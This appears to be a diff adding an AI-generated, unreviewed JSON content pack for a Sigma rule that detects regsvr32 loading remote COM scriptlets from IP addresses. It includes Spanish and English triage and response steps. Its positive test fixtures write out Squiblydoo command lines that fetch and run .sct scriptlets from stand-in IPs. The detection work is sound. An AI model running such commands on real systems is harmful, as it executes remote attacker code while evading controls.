@@ -1,0 +1,133 @@
+{
+  "rule": {
+    "id": "2dd2c217-bf68-437a-b57c-fe9fd01d5de8",
+    "title": "Potentially Suspicious Regsvr32 HTTP IP Pattern",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_regsvr32_http_ip_pattern.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_regsvr32_http_ip_pattern.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218.010"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó regsvr32.exe con el parámetro /i: (o -i:) apuntando a una URL HTTP/HTTPS cuyo host empieza con un dígito, lo que normalmente indica una dirección IP. Es el patrón típico de carga remota de scriptlets (Squiblydoo) para ejecutar código evadiendo controles.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en \\regsvr32.exe u OriginalFileName es REGSVR32.EXE, y CommandLine contiene ' /i:http(s)://' o ' -i:http(s)://' seguido de un dígito del 1 al 9.",
+      "why_it_matters": "Regsvr32 es un binario firmado de Microsoft que puede descargar y ejecutar un scriptlet COM (.sct) remoto mediante scrobj.dll (ATT&CK T1218.010, ejecución mediante binario firmado). Usar una IP en lugar de un dominio sugiere infraestructura improvisada del atacante y evasión de controles de reputación.",
+      "triage_steps": [
+        "Revisar CommandLine completo: extraer la IP, la ruta del archivo remoto (.sct, .dll) y opciones como /s, /n, /u y scrobj.dll.",
+        "Confirmar si Image está en System32/SysWOW64 o si es una copia renombrada (OriginalFileName REGSVR32.EXE con otra ruta).",
+        "Analizar ParentImage y su línea de comandos: Office, wscript, mshta, cmd o powershell como padre aumentan mucho la sospecha.",
+        "Buscar la IP de destino en logs de proxy, firewall y DNS; verificar si hubo conexión exitosa y qué contenido se descargó.",
+        "Revisar procesos hijos de regsvr32 y actividad en el mismo host ±15 minutos: nuevos procesos, archivos creados, claves Run o tareas programadas.",
+        "Pivotar por el usuario y la IP: otros hosts que contactaron la misma IP o ejecutaron regsvr32 con /i: remoto.",
+        "Consultar alertas previas del mismo endpoint y usuario, como adjuntos maliciosos o ejecución de macros."
+      ],
+      "false_positives": [
+        "Dominios FQDN legítimos que comienzan con un número (por ejemplo, 7-zip u otros proveedores) usados en registros de componentes.",
+        "Pruebas autorizadas de red team o validaciones de detección (Atomic Red Team) con IPs de laboratorio.",
+        "Scripts internos de despliegue antiguos que registran componentes desde un servidor interno referenciado por IP."
+      ],
+      "response_steps": [
+        "Verificar con el usuario y el equipo de TI si la ejecución estaba autorizada antes de actuar.",
+        "Si es malicioso, aislar el endpoint y bloquear la IP de destino en proxy y firewall.",
+        "Recolectar el scriptlet o DLL descargado, el hash y la memoria del proceso para análisis.",
+        "Eliminar la persistencia identificada y artefactos descargados; restablecer credenciales del usuario si hubo ejecución de payload.",
+        "Buscar la misma IP y patrón en toda la flota y considerar restringir regsvr32 con conexiones salientes mediante reglas de ASR o firewall."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque regsvr32 cargando código remoto desde una IP casi nunca es legítimo y suele indicar ejecución activa de un atacante."
+    },
+    "en": {
+      "summary": "regsvr32.exe ran with /i: (or -i:) pointing at an HTTP/HTTPS URL whose host starts with a digit, usually an IP address. This is the classic remote scriptlet loading pattern (Squiblydoo) used to run code while evading controls.",
+      "what_it_detects": "Process creation events where Image ends with \\regsvr32.exe or OriginalFileName is REGSVR32.EXE, and CommandLine contains ' /i:http(s)://' or ' -i:http(s)://' followed by a digit 1-9.",
+      "why_it_matters": "Regsvr32 is a signed Microsoft binary that can fetch and execute a remote COM scriptlet (.sct) via scrobj.dll (ATT&CK T1218.010, signed binary proxy execution). A raw IP instead of a domain suggests ad hoc attacker infrastructure and bypasses reputation filtering.",
+      "triage_steps": [
+        "Read the full CommandLine: extract the IP, the remote file path (.sct, .dll) and switches such as /s, /n, /u and scrobj.dll.",
+        "Check whether Image is in System32/SysWOW64 or a renamed copy (OriginalFileName REGSVR32.EXE at an unusual path).",
+        "Review ParentImage and its command line; Office apps, wscript, mshta, cmd or powershell as parent strongly raise suspicion.",
+        "Look up the destination IP in proxy, firewall and DNS logs; confirm whether the connection succeeded and what was downloaded.",
+        "Review regsvr32 child processes and host activity within +/- 15 minutes: new processes, dropped files, Run keys, scheduled tasks.",
+        "Pivot on the user and IP: other hosts contacting the same IP or running regsvr32 with a remote /i: argument.",
+        "Check earlier alerts for the same endpoint and user, such as malicious attachments or macro execution."
+      ],
+      "false_positives": [
+        "Legitimate FQDNs that start with a number (for example 7-zip or similar vendors) used when registering components.",
+        "Authorized red team exercises or detection validation (Atomic Red Team) using lab IPs.",
+        "Legacy internal deployment scripts registering components from an internal server referenced by IP."
+      ],
+      "response_steps": [
+        "Confirm with the user and IT whether the execution was authorized before acting.",
+        "If malicious, isolate the endpoint and block the destination IP at proxy and firewall.",
+        "Collect the downloaded scriptlet or DLL, its hash and process memory for analysis.",
+        "Remove identified persistence and dropped artifacts; reset user credentials if a payload executed.",
+        "Hunt for the same IP and pattern fleet-wide; consider blocking outbound network access for regsvr32 via ASR or firewall rules."
+      ],
+      "severity_rationale": "High fits because regsvr32 loading remote code from a raw IP is rarely legitimate and usually indicates active attacker execution."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Classic Squiblydoo: regsvr32 spawned by Word loads a remote scriptlet from an IP over HTTP.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\regsvr32.exe",
+          "OriginalFileName": "REGSVR32.EXE",
+          "CommandLine": "regsvr32.exe /s /n /u /i:http://198.51.100.23/files/update.sct scrobj.dll",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "ParentCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\jperez\\Downloads\\factura.docm\""
+        }
+      },
+      {
+        "description": "Renamed regsvr32 copy (matched by OriginalFileName) using dash syntax and HTTPS to an IP.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "Image": "C:\\Users\\Public\\svchelper.exe",
+          "OriginalFileName": "REGSVR32.EXE",
+          "CommandLine": "svchelper.exe -s -n -u -i:https://203.0.113.10:8443/a.sct scrobj.dll",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "regsvr32 with /i: pointing at a domain name that does not start with a digit.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\regsvr32.exe",
+          "OriginalFileName": "REGSVR32.EXE",
+          "CommandLine": "regsvr32.exe /s /i:https://updates.example.com/component.sct scrobj.dll",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "Normal local DLL registration by an installer, no remote URL.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0310.andes.example.com",
+          "User": "ANDES\\svc_deploy",
+          "Image": "C:\\Windows\\SysWOW64\\regsvr32.exe",
+          "OriginalFileName": "REGSVR32.EXE",
+          "CommandLine": "regsvr32.exe /s \"C:\\Program Files (x86)\\ExampleApp\\exampleshell.dll\"",
+          "ParentImage": "C:\\Windows\\System32\\msiexec.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
